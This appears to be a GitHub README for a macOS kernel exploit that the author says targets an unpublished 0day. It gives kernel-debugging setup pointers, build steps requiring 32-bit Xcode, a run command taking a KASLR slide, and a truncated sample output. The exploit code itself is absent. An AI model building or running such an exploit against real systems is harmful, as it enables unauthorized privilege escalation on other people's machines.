# macOS-Kernel-Exploit

## General 
macOS Kernel Exploit for CVE-????-???? (currently a 0day. 
I'll add the CVE# once it is published ;) ). 

Thanks to @LinusHenze for this cool bug and his support ;P.

## Writeup

Probably coming soon.
If you want to try and exploit it yourself, here are a few things to get you started:

- VM: Download the macOS installer from the appstore and drag the `.app` file into VMWare's `NEW VM` window
- Kernel Debugging setup: http://ddeville.me/2015/08/using-the-vmware-fusion-gdb-stub-for-kernel-debugging-with-lldb
- Have a look at the _kernel_trap function


## Build

You will need XCODE <= 9.4.1 to build the exploit. (It needs to be 32bit)

```
make
```

## Execution

```
./exploit <KASLR slide>
```

NOTE: a KASLR leak is required in order for the exploit to do more that just 
freezing the system so it's not that bad :)

**Example**:
```
[debug@Kernel-Mac Shared ]$ ./exploit 0x1600000
[*] Kernel slide: 0x1600000
[*] uid=0x1f5 euid=0x1f5 gid=0x14 egid=0x14
